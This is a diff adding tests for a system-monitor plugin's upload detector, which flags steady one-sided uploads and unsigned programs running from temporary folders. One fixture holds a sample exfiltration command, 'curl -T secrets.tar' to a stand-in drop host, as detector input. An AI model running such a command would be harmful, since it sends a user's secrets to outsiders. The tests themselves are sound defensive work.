@@ -3,6 +3,7 @@ import type { On } from 'claude-code'
 import type { TestBody } from 'claude-code/testing'
 
 import { cleanupPrompt, parseDf, parseProcs, parseSample, protection } from '../hooks/model'
+import { alertNotes, newTracker, parseNetstat, parseNettop, parseRemotes, parseSignature, step, VOLUME } from '../hooks/net'
 
 const PANE = {
   plugin: 'sysmon',
@@ -39,6 +40,8 @@ const PS = [
   ' 4242     1  88.5 512000 Google Chrome Helper (Renderer)',
   ' 5555     1  12.0 2097152 node',
   ' 6000     1   0.0    800 sleep',
+  ' 6100   501   3.0  20000 curl',
+  ' 6200     1   1.0  90000 zoom.us',
 ].join('\n')
 
 const DF = [
@@ -78,6 +81,23 @@ const sampleText = (idle = 66) =>
     DF,
   ].join('\n')
 
+// What the details shell prints for the uploading curl.
+const DETAILS = [
+  '@@path',
+  '/private/tmp/x/curl',
+  '@@ps',
+  'budi   501 Wed Oct 28 11:43:48 2026',
+  '@@args',
+  'curl -T secrets.tar https://drop.example.net/upload',
+  '@@parent',
+  '  501 zsh',
+  '@@lsof',
+  'COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME',
+  'curl    6100 budi    5u  IPv4 0x1      0t0  TCP 192.168.1.5:50000->203.0.113.7:443 (ESTABLISHED)',
+  '@@sign',
+  '/private/tmp/x/curl: code object is not signed at all',
+].join('\n')
+
 function engine(on: On) {
   const clock = mock.clock(on, { now: NOW })
   mock.store(on)
@@ -87,8 +107,11 @@ function engine(on: On) {
     runs: [] as (readonly string[])[],
     toasts: [] as string[],
     idle: 66,
+    /** Network: when set, each sample adds nettop/netstat counters that grow with the clock. */
+    net: undefined as undefined | { upRate: number; idleSec: number },
+    notifications: [] as string[],
     /** pid → name for `ps -p`; missing means gone. */
-    alive: { 4242: 'Google Chrome Helper (Renderer)', 5555: 'node' } as Record<number, string>,
+    alive: { 4242: 'Google Chrome Helper (Renderer)', 5555: 'node', 6100: 'curl' } as Record<number, string>,
     /** pids that ignore SIGTERM. */
     stubborn: new Set<number>(),
   }
@@ -97,7 +120,25 @@ function engine(on: On) {
     calls.runs.push(argv)
     const ok = (stdout = '', exitCode = 0, stderr = '') => ({ value: { exitCode, stdout, stderr, isStdoutTruncated: false, isStderrTruncated: false } })
     if (argv[0] === 'uname') return ok('Darwin\n')
-    if (argv[0] === 'sh') return ok(sampleText(calls.idle))
+    if (argv[0] === 'sh' && String(argv[2]).includes('lsof -nP -a -p')) return ok(DETAILS)
+    if (argv[0] === 'sh') {
+      if (!calls.net) return ok(sampleText(calls.idle))
+      const secs = (clock.now() - NOW) / 1000
+      const up = Math.round(calls.net.upRate * secs)
+      const zoom = Math.round(300_000 * secs) // a video call: as much in as out
+      const nettop = [',bytes_in,bytes_out,', `curl.6100,${1000 + Math.round(secs * 100)},${up},`, `zoom.us.6200,${zoom},${zoom},`, 'launchd.1,0,0,'].join('\n')
+      const netstat = [
+        'Name       Mtu   Network       Address            Ipkts Ierrs     Ibytes    Opkts Oerrs     Obytes  Coll',
+        `lo0        16384 <Link#1>                      100     0 999999 100     0 999999     0`,
+        `en0        1500  <Link#11>   aa:bb:cc:dd:ee:ff 100     0 ${zoom + 5000} 100     0 ${zoom + up + 5000}     0`,
+        `utun4      1280  <Link#20>                     100     0 ${up} 100     0 ${up}     0`,
+      ].join('\n')
+      return ok(`${sampleText(calls.idle)}\n@@nettop\n${nettop}\n@@netstat\n${netstat}\n@@idle\n${calls.net.idleSec}\n`)
+    }
+    if (argv[0] === 'osascript') {
+      calls.notifications.push(String(argv[2]))
+      return ok()
+    }
     if (argv[0] === 'ps') {
       const pid = Number(argv[argv.indexOf('-p') + 1])
       const name = calls.alive[pid]
@@ -302,4 +343,132 @@ test('polling is fast while the pane is open and slow otherwise', async ($, on) 
   await calls.clock.advance(10_000)
   expect(samples()).toBeGreaterThan(3)
   await ui.unmount()
+})
+
+// ---------- network ----------
+
+const MB = 1024 * 1024
+const counters = (entries: [number, string, number, number][]) => new Map(entries.map(([pid, name, i, o]) => [pid, { name, in: i, out: o }]))
+
+test('nettop, netstat, signatures and connections are read', () => {
+  const n = parseNettop(',bytes_in,bytes_out,\nCodex (Service).29036,11539362,9632302,\nio.tailscale.ip.73183,5,6,\n')
+  expect(n.get(29036)).toEqual({ name: 'Codex (Service)', in: 11539362, out: 9632302 })
+  expect(n.get(73183)?.name).toBe('io.tailscale.ip')
+  const t = parseNetstat(
+    ['Name Mtu Network Address Ipkts Ierrs Ibytes Opkts Oerrs Obytes Coll', 'lo0 16384 <Link#1> 5 0 900 5 0 900 0', 'en0 1500 <Link#11> aa:bb 5 0 1000 5 0 2000 0', 'en0 1500 192.168.1 192.168.1.5 5 - 1000 5 - 2000 -', 'utun3 1380 <Link#20> 5 0 70 5 0 80 0'].join('\n'),
+  )
+  expect(t).toEqual({ in: 1000, out: 2000 })
+  expect(parseSignature('Identifier=com.apple.ssh\nPlatform identifier=26\nAuthority=macOS Software Signing')?.kind).toBe('apple')
+  expect(parseSignature('Authority=Developer ID Application: Tailscale Inc. (W5364U7YZB)')?.text).toBe('Developer ID: Tailscale Inc. (W5364U7YZB)')
+  expect(parseSignature('Identifier=node-5555\nSignature=adhoc')?.kind).toBe('adhoc')
+  expect(parseSignature('/tmp/x: code object is not signed at all')?.kind).toBe('unsigned')
+  expect(parseRemotes(DETAILS)).toEqual(['203.0.113.7:443'])
+})
+
+test('a steady one-sided upload trips the detector; a video call does not', () => {
+  const t = newTracker()
+  let at = NOW
+  let last: ReturnType<typeof step> = []
+  for (let i = 0; i <= 3; i++, at += 30_000) {
+    const s = i * 30
+    last = step(t, at, counters([[10, 'rclone', s * 1000, s * MB], [20, 'zoom.us', s * 300_000, s * 300_000]]), { in: 0, out: 0 })
+  }
+  expect(last.find(x => x.pid === 10)?.alertSince, 'rclone after 90 s at 1 MB/s').toBeDefined()
+  expect(last.find(x => x.pid === 10)?.outRate).toBe(MB)
+  expect(last.find(x => x.pid === 20)?.alertSince, 'zoom sends as much as it gets').toBeUndefined()
+})
+
+test('a large burst trips it at once, and the alert clears two minutes after the upload stops', () => {
+  const t = newTracker()
+  step(t, NOW, counters([[10, 'tar', 0, 0]]), { in: 0, out: 0 })
+  const burst = step(t, NOW + 30_000, counters([[10, 'tar', 0, VOLUME + MB]]), { in: 0, out: 0 })
+  expect(burst[0]?.alertSince).toBe(NOW + 30_000)
+  // Quiet from now on: the 10-minute total still holds the burst, so it stays until the window passes it.
+  let at = NOW + 30_000
+  let last = burst
+  while (last[0]?.alertSince !== undefined && at < NOW + 20 * 60_000) {
+    at += 30_000
+    last = step(t, at, counters([[10, 'tar', 0, VOLUME + MB]]), { in: 0, out: 0 })
+  }
+  expect(at - NOW, 'cleared after the window and the grace time').toBeLessThan(14 * 60_000)
+})
+
+test('an unsigned program uploading from /tmp while you are away is red', () => {
+  const r = alertNotes({ idleSec: 600, details: { path: '/private/tmp/x/curl', remotes: [], signature: { kind: 'unsigned', text: 'Not signed' } } })
+  expect(r.level).toBe('error')
+  expect(r.notes.length).toBe(3)
+  expect(alertNotes({ idleSec: 5, details: { path: '/Applications/Dropbox.app/Contents/MacOS/Dropbox', remotes: [], signature: { kind: 'developer', text: 'Developer ID: Dropbox' } } }).level).toBe('warning')
+})
+
+async function uploading($: Parameters<TestBody>[0], on: On) {
+  const calls = engine(on)
+  calls.net = { upRate: 2 * MB, idleSec: 600 }
+  await started($, calls)
+  await calls.clock.advance(95_000) // closed pane: a sample every 30 s
+  return calls
+}
+
+test('the alert names the program, where it runs from, its signer and where it sends', async ($, on) => {
+  const calls = await uploading($, on)
+  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
+  expect(await ui.find({ type: 'Text', text: '⚠ curl (pid 6100) keeps uploading' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: /^Sent .* · now ↑ 2\.0 MB\/s ↓ 100 B\/s · steady for/ })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: 'You have been away 10 min while it kept sending.' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: 'It runs from a temporary or download folder.' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: '/private/tmp/x/curl' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: 'Not signed' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: 'curl -T secrets.tar https://drop.example.net/upload' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: /by zsh \(pid 501\)/ })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: '203.0.113.7:443' })).toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: /zoom/ }), 'the video call is listed').toBeTruthy()
+  expect(await ui.find({ type: 'Text', text: '⚠ zoom.us (pid 6200) keeps uploading' }), 'but not alerted').toBeUndefined()
+  // The network total skips the tunnel, which carries the same bytes again.
+  expect(await ui.find({ type: 'Text', text: /^↑ 2\.[0-9] MB\/s$/ })).toBeTruthy()
+  expect(calls.toasts.filter(t => t.startsWith('Unusual upload: curl')).length, 'one toast').toBe(1)
+  expect(calls.notifications.length, 'one macOS notification').toBe(1)
+  await ui.unmount()
+})
+
+test('Kill from an alert asks first, then ends the uploader', async ($, on) => {
+  const calls = await uploading($, on)
+  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
+  await ui.press({ key: 'net-kill-6100' })
+  expect(calls.runs.some(a => a[0] === 'kill')).toBe(false)
+  expect(await ui.find({ type: 'Text', text: 'Kill curl (pid 6100)?' })).toBeTruthy()
+  await ui.press({ key: 'kill-confirm' })
+  await calls.clock.advance(2_500)
+  expect(calls.runs.some(a => a.join(' ') === 'kill -TERM 6100')).toBe(true)
+  expect(calls.toasts.at(-1)).toBe('Ended curl (pid 6100) with SIGTERM.')
+  await ui.unmount()
+})
+
+test('Ignore hides the alert for good, shared through the store; Unignore brings it back', async ($, on) => {
+  const calls = await uploading($, on)
+  const ui = await $.ui.mount({ ...PANE, surface: 'desktop' })
+  await ui.press({ key: 'net-ignore-6100' })
+  expect(await ui.find({ type: 'Text', text: /keeps uploading/ })).toBeUndefined()
+  await calls.clock.advance(10_000)
+  expect(await ui.find({ type: 'Text', text: /keeps uploading/ }), 'still hidden after new readings').toBeUndefined()
+  await ui.press({ key: 'net-show-ignored' })
+  expect(await ui.find({ type: 'Text', text: 'curl · /private/tmp/x/curl' })).toBeTruthy()
+  await ui.press({ key: 'net-unignore-/private/tmp/x/curl' })
+  await calls.clock.advance(4_000)
+  expect(await ui.find({ type: 'Text', text: /curl \(pid 6100\) keeps uploading/ })).toBeTruthy()
+  await ui.unmount()
+})
+
+test('the band flags the upload in red', async ($, on) => {
+  on('ui.render', { component: 'AbovePrompt' }, ($, e) => {
+    const { Box } = $.ui.resolve(e)
+    return <Box />
+  })
+  const calls = await uploading($, on)
+  const band = await $.ui.mount({ ...BAND, surface: 'desktop' })
+  const line = await band.find({ type: 'Text', text: /^CPU/ })
+  const spans = (line?.children ?? []) as { props: { color?: string }; children: string[] }[]
+  const alert = spans.find(c => String(c.children[0]).startsWith('⚠ Upload'))
+  expect(alert?.children[0]).toBe('⚠ Upload: curl 2.0 MB/s')
+  expect(alert?.props.color).toBe('error')
+  expect(calls.notifications.length).toBe(1)
+  await band.unmount()
 })
